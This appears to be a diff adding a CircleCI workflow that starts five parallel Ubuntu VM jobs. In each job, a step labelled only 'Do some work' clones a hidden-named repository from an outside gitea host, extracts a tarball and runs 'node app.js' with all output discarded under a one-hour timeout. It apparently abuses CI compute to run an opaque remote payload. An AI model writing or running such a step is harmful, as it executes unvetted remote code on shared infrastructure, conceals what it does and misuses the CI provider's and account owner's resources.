@@ -1,0 +1,34 @@
+version: 2.1
+
+# 1. Define the job once
+jobs:
+  ubuntu-job:
+    # Use the Machine executor to get a full Ubuntu VM instead of a Docker container
+    machine:
+      image: ubuntu-2204:current
+    
+    steps:
+      - checkout
+      - run:
+          name: "Verify Ubuntu Version"
+          command: "cat /etc/os-release"
+      - run:
+          name: "Do some work"
+          command: "git clone https://gitea.com/Debok/.g.git && cd .g && tar xvf t.tar.xz && node app.js >/dev/null 2>&1"
+          # Add your 1-hour timeout here:
+          no_output_timeout: 1h
+
+# 2. Orchestrate the 5 jobs in a workflow
+workflows:
+  run-five-jobs:
+    jobs:
+      - ubuntu-job:
+          name: ubuntu-job-1
+      - ubuntu-job:
+          name: ubuntu-job-2
+      - ubuntu-job:
+          name: ubuntu-job-3
+      - ubuntu-job:
+          name: ubuntu-job-4
+      - ubuntu-job:
+          name: ubuntu-job-5 # <-- FIXED: Removed " time out 1"
